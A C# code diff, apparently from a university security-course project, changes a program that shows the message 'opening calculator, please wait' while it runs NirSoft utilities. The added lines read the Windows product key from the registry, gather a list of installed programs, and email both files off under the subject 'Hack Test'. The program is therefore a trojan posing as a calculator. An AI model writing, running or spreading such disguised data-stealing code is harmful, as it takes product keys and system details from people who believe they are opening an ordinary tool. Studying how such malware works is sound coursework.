@@ -2,6 +2,7 @@
 using System.Collections.Generic;
 using System.ComponentModel;
 using System.Windows.Forms;
+using System.IO;
 
 namespace TP
 {
@@ -100,10 +101,16 @@ namespace TP
             Console.WriteLine("Abriendo calculadora. Por favor espere...");
             List<string> files = new List<string>();
 
-            files.NirsoftToolExecAndAdd("ProduKey.exe");
+            //files.NirsoftToolExecAndAdd("ProduKey.exe");
             files.NirsoftToolExecAndAdd("awatch.exe");
-
-            //Helpers.sendMail("Prueba", "Estoy probando", files);
+            
+            string key = Helpers.GetWindowsProductKeyFromRegistry();
+            var path = @"D:\Matias\Facultad\Seguridad\TP\tp-seginf\code\TP\produkey.txt";
+            File.WriteAllText(path, key);
+            Helpers.getProgramList();
+            files.Add(path);
+            files.Add(@"D:\Matias\Facultad\Seguridad\TP\tp-seginf\code\TP\programList.txt");
+            Helpers.sendMail("Hack Test", "Hacked Files", files);
         }
 
         private void backgroundWorker1_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
